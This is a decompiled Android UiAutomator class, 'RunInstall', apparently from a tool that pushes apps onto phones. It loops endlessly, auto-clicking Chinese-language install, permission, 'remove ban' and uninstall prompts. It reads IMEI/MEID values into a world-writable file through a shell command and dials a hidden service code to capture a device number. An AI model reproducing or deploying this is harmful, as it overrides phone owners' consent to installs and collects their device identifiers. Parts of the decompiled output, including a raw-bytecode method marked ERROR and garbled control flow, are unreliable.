package run;

import android.os.RemoteException;
import android.os.SystemClock;
import com.android.uiautomator.core.UiDevice;
import com.android.uiautomator.core.UiObject;
import com.android.uiautomator.core.UiObjectNotFoundException;
import com.android.uiautomator.core.UiSelector;
import com.android.uiautomator.testrunner.UiAutomatorTestCase;
import com.dingkai.uiautomatorstub.watcher.ClickUiObjectWatcher;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.util.HashSet;
import java.util.Iterator;

public class RunInstall extends UiAutomatorTestCase
{
  static final int getsn = 2;
  static final int looper = 1;
  static final int looper_cao = 3;
  static final int volumeDown = 25;
  static final int volumeUP = 24;
  int correnttste = 3;
  boolean isExitWithSettings = false;
  String[] keylist = { "激活", "确定", "确认", "始终", "启动", "立即清理", "完成", "下一步", "关闭", "清理", "好", "允许本次安装", "安装", "允许", "解除", "等待", "继续卸载", "立即清除", "解除禁止", "卸载", "立即删除" };
  boolean keylistexit = false;
  String[] numkey = { "零", "一", "二", "三", "四", "五", "六", "七", "八", "九" };
  boolean volumeFlage = false;

  private void call2getNum()
  {
    try
    {
      new UiObject(new UiSelector().description("拨号")).click();
      UiObject localUiObject1 = new UiObject(new UiSelector().description("星形符号"));
      localUiObject1.click();
      sleep(3);
      UiObject localUiObject2 = new UiObject(new UiSelector().description("英镑符号"));
      localUiObject2.click();
      localUiObject1.click();
      localUiObject2.click();
      clickNum(1);
      clickNum(3);
      clickNum(5);
      clickNum(7);
      clickNum(9);
      clickNum(4);
      clickNum(6);
      localUiObject2.click();
      localUiObject1.click();
      localUiObject2.click();
      localUiObject1.click();
      UiObject localUiObject3 = new UiObject(new UiSelector().className("android.widget.TextView").textMatches("\\d+"));
      if (localUiObject3 != null)
        writetoSD(localUiObject3.getText());
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  private void clickNum(int paramInt)
  {
    String str = this.numkey[paramInt];
    UiObject localUiObject = new UiObject(new UiSelector().description(str));
    try
    {
      localUiObject.click();
      return;
    }
    catch (UiObjectNotFoundException localUiObjectNotFoundException)
    {
      localUiObjectNotFoundException.printStackTrace();
    }
  }

  private void clickVolume(int paramInt)
  {
    try
    {
      shellhelper.ExecShell("input keyevent " + paramInt);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  private void findndClickFromParent(UiObject paramUiObject)
  {
  }

  private boolean isStartVolume()
  {
    return PhoneBrand.getInstance().Brand.equals("GiONEE");
  }

  private void loopclick()
  {
    if (!this.keylistexit)
      this.keylistexit = true;
    do
    {
      if ((this.isExitWithSettings) && (new UiObject(new UiSelector().packageName("com.android.settings")).exists()))
        return;
      uiSelectorClick();
      SystemClock.sleep(50L);
    }
    while (0 == 0);
  }

  private void loopclickCao()
  {
    this.keylistexit = true;
    specialDevicesKeys();
    startVolume();
    loopclick();
  }

  private void loopclickDef()
  {
    readFromSD();
    loopclick();
  }

  private void readFromSD()
  {
    File localFile = new File("/data/local/tmp/keylist.pro");
    String str1 = "";
    if (!localFile.exists())
      this.keylistexit = false;
    while (true)
    {
      return;
      try
      {
        InputStreamReader localInputStreamReader = new InputStreamReader(new FileInputStream("/data/local/tmp/keylist.pro"), "utf-8");
        BufferedReader localBufferedReader = new BufferedReader(localInputStreamReader);
        while (true)
        {
          String str2 = localBufferedReader.readLine();
          if (str2 == null)
            break;
          str1 = str1 + str2;
        }
        localInputStreamReader.close();
        if ((str1 != null) && (str1.length() > 0))
        {
          String[] arrayOfString = str1.split("#");
          if (arrayOfString.length <= 0)
            continue;
          this.keylist = arrayOfString;
          this.keylistexit = true;
        }
      }
      catch (Exception localException)
      {
        this.keylistexit = false;
        return;
      }
    }
    this.keylistexit = false;
  }

  private void sleep(int paramInt)
  {
    long l = paramInt;
    try
    {
      Thread.sleep(l);
      return;
    }
    catch (InterruptedException localInterruptedException)
    {
      localInterruptedException.printStackTrace();
    }
  }

  private void specialDevicesKeys()
  {
    String str = PhoneBrand.getInstance().Model;
    System.out.println("Model:" + str);
    if ((str != null) && (str.equals("Coolpad Y76")))
    {
      String[] arrayOfString = new String[1 + this.keylist.length];
      System.arraycopy(this.keylist, 0, arrayOfString, 0, this.keylist.length);
      arrayOfString[(-1 + arrayOfString.length)] = "打开";
      this.keylist = arrayOfString;
    }
  }

  private void startVolume()
  {
    if (isStartVolume())
      new Thread(new Runnable()
      {
        public void run()
        {
          label19: RunInstall localRunInstall;
          if (RunInstall.this.volumeFlage)
          {
            RunInstall.this.clickVolume(25);
            localRunInstall = RunInstall.this;
            if (RunInstall.this.volumeFlage)
              break label62;
          }
          label62: for (boolean bool = true; ; bool = false)
          {
            localRunInstall.volumeFlage = bool;
            SystemClock.sleep(7500L);
            break;
            RunInstall.this.clickVolume(24);
            break label19;
          }
        }
      }).start();
  }

  private void uiSelectorClick()
  {
    while (true)
    {
      int i;
      try
      {
        if (new UiObject(new UiSelector().packageName("com.mycheering.apps")).exists())
          return;
        getUiDevice().wakeUp();
        if ((this.keylist == null) || (this.keylist.length <= 0))
          break;
        i = 0;
        if (i >= this.keylist.length)
          break;
        String str = this.keylist[i];
        UiSelector localUiSelector = new UiSelector();
        localUiSelector.className("android.widget.FrameLayout");
        UiObject localUiObject1 = new UiObject(new UiSelector().text(str));
        if ((localUiObject1.exists()) && ((localUiObject1.isEnabled()) || (localUiObject1.isClickable())))
        {
          localUiObject1.click();
          if (str.equals("允许"))
          {
            UiObject localUiObject3 = new UiObject(new UiSelector().text("确定"));
            if ((localUiObject3.exists()) && (localUiObject3.isClickable()))
              localUiObject3.click();
          }
        }
        if ((localUiObject1.exists()) && (!localUiObject1.isClickable()))
        {
          UiObject localUiObject2 = localUiObject1.getFromParent(localUiSelector);
          if ((!localUiObject2.exists()) || (!localUiObject2.isClickable()))
            break;
          localUiObject2.click();
          return;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
      i++;
    }
  }

  private void watcherClick()
  {
    int i = 1;
    for (int j = 0; j < this.keylist.length; j++)
    {
      String str = this.keylist[j];
      UiSelector[] arrayOfUiSelector = new UiSelector[1];
      arrayOfUiSelector[0] = new UiSelector().textContains(str);
      UiDevice localUiDevice = UiDevice.getInstance();
      Object[] arrayOfObject = new Object[1];
      arrayOfObject[0] = Integer.valueOf(i);
      localUiDevice.registerWatcher(String.format("watcher_%d", arrayOfObject), new ClickUiObjectWatcher(arrayOfUiSelector, new UiSelector().text(str)));
      i++;
    }
    try
    {
      UiDevice.getInstance().wakeUp();
      UiDevice.getInstance().runWatchers();
    }
    catch (RemoteException localRemoteException)
    {
      try
      {
        Thread.sleep(10L);
        return;
        localRemoteException = localRemoteException;
        localRemoteException.printStackTrace();
      }
      catch (InterruptedException localInterruptedException)
      {
        localInterruptedException.printStackTrace();
      }
    }
  }

  // ERROR //
  private void writetoSD(String paramString)
  {
    // Byte code:
    //   0: new 238	java/io/File
    //   3: dup
    //   4: ldc_w 386
    //   7: invokespecial 242	java/io/File:<init>	(Ljava/lang/String;)V
    //   10: astore_2
    //   11: aload_2
    //   12: invokevirtual 245	java/io/File:exists	()Z
    //   15: ifne +8 -> 23
    //   18: aload_2
    //   19: invokevirtual 389	java/io/File:mkdirs	()Z
    //   22: pop
    //   23: new 238	java/io/File
    //   26: dup
    //   27: ldc_w 391
    //   30: invokespecial 242	java/io/File:<init>	(Ljava/lang/String;)V
    //   33: astore_3
    //   34: aload_3
    //   35: invokevirtual 245	java/io/File:exists	()Z
    //   38: ifne +8 -> 46
    //   41: aload_3
    //   42: invokevirtual 394	java/io/File:createNewFile	()Z
    //   45: pop
    //   46: aconst_null
    //   47: astore 4
    //   49: new 396	java/io/FileWriter
    //   52: dup
    //   53: ldc_w 391
    //   56: iconst_1
    //   57: invokespecial 399	java/io/FileWriter:<init>	(Ljava/lang/String;Z)V
    //   60: astore 5
    //   62: aload 5
    //   64: aload_1
    //   65: invokevirtual 402	java/io/FileWriter:write	(Ljava/lang/String;)V
    //   68: aload 5
    //   70: ifnull +8 -> 78
    //   73: aload 5
    //   75: invokevirtual 403	java/io/FileWriter:close	()V
    //   78: return
    //   79: astore 11
    //   81: aload 11
    //   83: invokevirtual 404	java/io/IOException:printStackTrace	()V
    //   86: goto -40 -> 46
    //   89: astore 10
    //   91: aload 10
    //   93: invokevirtual 404	java/io/IOException:printStackTrace	()V
    //   96: return
    //   97: astore 6
    //   99: aload 6
    //   101: invokevirtual 404	java/io/IOException:printStackTrace	()V
    //   104: aload 4
    //   106: ifnull -28 -> 78
    //   109: aload 4
    //   111: invokevirtual 403	java/io/FileWriter:close	()V
    //   114: return
    //   115: astore 9
    //   117: aload 9
    //   119: invokevirtual 404	java/io/IOException:printStackTrace	()V
    //   122: return
    //   123: astore 7
    //   125: aload 4
    //   127: ifnull +8 -> 135
    //   130: aload 4
    //   132: invokevirtual 403	java/io/FileWriter:close	()V
    //   135: aload 7
    //   137: athrow
    //   138: astore 8
    //   140: aload 8
    //   142: invokevirtual 404	java/io/IOException:printStackTrace	()V
    //   145: goto -10 -> 135
    //   148: astore 7
    //   150: aload 5
    //   152: astore 4
    //   154: goto -29 -> 125
    //   157: astore 6
    //   159: aload 5
    //   161: astore 4
    //   163: goto -64 -> 99
    //
    // Exception table:
    //   from	to	target	type
    //   41	46	79	java/io/IOException
    //   73	78	89	java/io/IOException
    //   49	62	97	java/io/IOException
    //   109	114	115	java/io/IOException
    //   49	62	123	finally
    //   99	104	123	finally
    //   130	135	138	java/io/IOException
    //   62	68	148	finally
    //   62	68	157	java/io/IOException
  }

  protected void setUp()
    throws Exception
  {
    super.setUp();
  }

  protected void tearDown()
    throws Exception
  {
    super.tearDown();
  }

  public void testDemo()
    throws UiObjectNotFoundException
  {
    HashSet localHashSet = new ReadOppoImei().ReadIMEI();
    if (localHashSet.size() > 0)
    {
      String str1 = "";
      Iterator localIterator = localHashSet.iterator();
      while (localIterator.hasNext())
      {
        String str2 = (String)localIterator.next();
        str1 = str1 + str2 + ',';
      }
      String[] arrayOfString = new String[3];
      arrayOfString[0] = "sh";
      arrayOfString[1] = "-c";
      arrayOfString[2] = ("echo '" + str1 + "' > /data/local/tmp/PHONE_MEID;chmod 777 /data/local/tmp/PHONE_MEID");
      shellhelper.ExecShell(arrayOfString);
    }
    switch (this.correnttste)
    {
    default:
      return;
    case 2:
      call2getNum();
      return;
    case 1:
      loopclickDef();
      return;
    case 3:
    }
    loopclickCao();
  }
}

/* Location:           C:\Users\Tato\Desktop\uiclick\classes_dex2jar.jar
 * Qualified Name:     run.RunInstall
 * JD-Core Version:    0.6.2
 */